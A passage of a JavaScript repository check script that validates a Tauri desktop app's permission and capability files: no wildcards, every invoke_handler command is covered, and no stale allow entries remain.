      invalidBlocks,
    )) {
      definitions.set(definition.identifier, definition);
    }
  }

  passIf(
    wildcardFiles.length === 0,
    "Tauri app command permission definitions do not contain wildcard strings",
    wildcardFiles.join(", "),
  );
  passIf(
    invalidBlocks.length === 0,
    "Tauri app command permission definitions are parseable",
    invalidBlocks.join(", "),
  );

  const missingDefinitions = commands
    .map((command) => [command, commandToPermission(command)])
    .filter(
      ([command, permission]) =>
        !definitions.get(permission)?.allowedCommands.includes(command),
    )
    .map(([command, permission]) => `${permission} -> ${command}`);
  passIf(
    missingDefinitions.length === 0,
    "Tauri app command permission definitions cover invoke_handler commands",
    missingDefinitions.join(", "),
  );

  const expectedPermissions = new Set(commands.map(commandToPermission));
  const staleDefinitions = [...definitions.keys()].filter(
    (permission) =>
      /^allow-[a-z0-9-]+$/.test(permission) &&
      !expectedPermissions.has(permission),
  );
  passIf(
    staleDefinitions.length === 0,
    "Tauri app command permission definitions have no stale allow entries",
    staleDefinitions.join(", "),
  );
}

function listTauriAppPermissionFiles() {
  return listFilesRecursive("apps/desktop/src-tauri/permissions")
    .filter((file) => file.endsWith(".toml"))
    .sort();
}

function listFilesRecursive(relativeDir) {
  const absoluteDir = resolve(root, relativeDir);
  if (!existsSync(absoluteDir)) {
    return [];
  }

  const files = [];
  for (const entry of readdirSync(absoluteDir, { withFileTypes: true })) {
    const relativePath = `${relativeDir}/${entry.name}`;
    if (entry.isDirectory()) {
      files.push(...listFilesRecursive(relativePath));
    } else if (entry.isFile()) {
      files.push(relativePath);
    }
  }
  return files;
}

function parsePermissionDefinitions(text, relativePath, invalidBlocks) {
  return text
    .split(/(?=^\s*\[\[permission\]\]\s*$)/m)
    .filter((block) => /^\s*\[\[permission\]\]/m.test(block))
    .map((block, index) =>
      parsePermissionDefinition(
        block,
        `${relativePath}#${index + 1}`,
        invalidBlocks,
      ),
    )
    .filter((definition) => definition !== null);
}

function parsePermissionDefinition(block, location, invalidBlocks) {
  const identifier = block.match(/^\s*identifier\s*=\s*"([^"]+)"\s*$/m)?.[1];
  const allowedCommandsText = block.match(
    /^\s*commands\.allow\s*=\s*\[([^\]]*)\]\s*$/m,
  )?.[1];
  if (!identifier || allowedCommandsText === undefined) {
    invalidBlocks.push(location);
    return null;
  }

  return {
    identifier,
    allowedCommands: parseTomlStringList(allowedCommandsText),
  };
}

function parseTomlStringList(value) {
  return [...value.matchAll(/"([^"\\]*(?:\\.[^"\\]*)*)"/g)].map((match) =>
    JSON.parse(`"${match[1]}"`),
  );
}

function readCheckedJson(relativePath) {
  try {
    return readJson(relativePath);
  } catch (error) {
    fail(
      `Tauri capability file '${relativePath}' is valid JSON`,
      errorMessage(error),
    );
    return null;
  }
}

function nonEmptyString(value) {
  return typeof value === "string" && value.trim() !== "";
}

function normalizeCapabilityFile(json) {
  if (Array.isArray(json)) {
    return json;
  }
  if (
    json !== null &&
    typeof json === "object" &&
    Array.isArray(json.capabilities)
  ) {
    return json.capabilities;
  }
  if (
    json !== null &&
    typeof json === "object" &&
    typeof json.identifier === "string"
  ) {
    return [json];
  }
  return [];
}

function collectWildcardStrings(value, location, wildcardLocations) {
  if (typeof value === "string") {
    if (value.includes("*")) {
      wildcardLocations.push(location);
    }
    return;
  }
  if (Array.isArray(value)) {
    value.forEach((entry, index) =>
      collectWildcardStrings(entry, `${location}[${index}]`, wildcardLocations),
    );
    return;
  }
  if (value !== null && typeof value === "object") {
    for (const [key, entry] of Object.entries(value)) {
      collectWildcardStrings(entry, `${location}.${key}`, wildcardLocations);
    }
  }
}

function capabilityIncludesWindow(capability, expectedWindow) {
  return (
    Array.isArray(capability?.windows) &&
    capability.windows.includes(expectedWindow)
  );
}

function capabilityPermissionIdentifiers(capability) {
  if (!Array.isArray(capability?.permissions)) {
    return [null];
  }
  return capability.permissions.map((permission) => {
    if (typeof permission === "string") {
      return permission;
    }
    if (
      permission !== null &&
      typeof permission === "object" &&
      typeof permission.identifier === "string"
    ) {
      return permission.identifier;
    }
    return null;
  });
}

function readTauriInvokeHandlerCommands() {
  const lib = readText("apps/desktop/src-tauri/src/lib.rs");
  const match = lib.match(
    /\.invoke_handler\s*\(\s*tauri::generate_handler!\s*\[([\s\S]*?)\]\s*\)/,
  );
  if (!match) {
    fail(
      "Tauri invoke_handler command list is parseable",
      "expected tauri::generate_handler![...]",
    );
    return [];
  }

  const body = stripRustComments(match[1]);
  const commands = body
    .split(",")
    .map((entry) => entry.trim())
    .filter(Boolean);
  const invalidCommands = commands.filter(
    (command) => !/^[A-Za-z_][A-Za-z0-9_]*$/.test(command),
  );
  passIf(commands.length > 0, "Tauri invoke_handler command list is not empty");
  passIf(
    invalidCommands.length === 0,
    "Tauri invoke_handler command list is parseable",
    invalidCommands.join(", "),
  );
  return invalidCommands.length === 0 ? commands : [];
}

function stripRustComments(text) {
  return text.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
}

function commandToPermission(command) {
  return `allow-${command.replaceAll("_", "-")}`;
}

function parseWorkflow(workflowText) {
  try {
    const document = parseDocument(workflowText, {
      merge: false,
      prettyErrors: true,
      strict: true,
      uniqueKeys: true,
    });
    if (document.errors.length > 0) {
      return null;
    }
    const value = document.toJS({ maxAliasCount: 0 });
    return isRecord(value) ? value : null;
  } catch {
    return null;
  }
}

function normalizeLineEndings(value) {
  return value.replace(/\r\n?/g, "\n");
}

function isRecord(value) {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

function readJson(relativePath) {
  return JSON.parse(readText(relativePath));
}

function readText(relativePath) {
  return readFileSync(resolve(root, relativePath), "utf8");
}

function readTextIfExists(relativePath) {
  const fullPath = resolve(root, relativePath);
  return existsSync(fullPath) ? readFileSync(fullPath, "utf8") : null;
}

function pass(label, detail) {
  checks.push({ ok: true, label, detail });
}

function fail(label, detail) {
  checks.push({ ok: false, label, detail });
}

function passIf(condition, label, detail) {
  checks.push({
    ok: Boolean(condition),
    label,
    detail: condition ? undefined : detail,
  });
}

function errorMessage(error) {
  if (
    error &&
    typeof error === "object" &&
    "stderr" in error &&
    typeof error.stderr === "string"
  ) {
    return error.stderr.trim();
  }
  return error instanceof Error ? error.message : String(error);
}

function readCliValue(flag) {
  const index = process.argv.indexOf(flag);
  if (index === -1) {
    return undefined;
  }

  const value = process.argv[index + 1];
  if (!value || value.startsWith("--")) {
    throw new Error(`${flag} requires a value`);
  }
  return value;
}
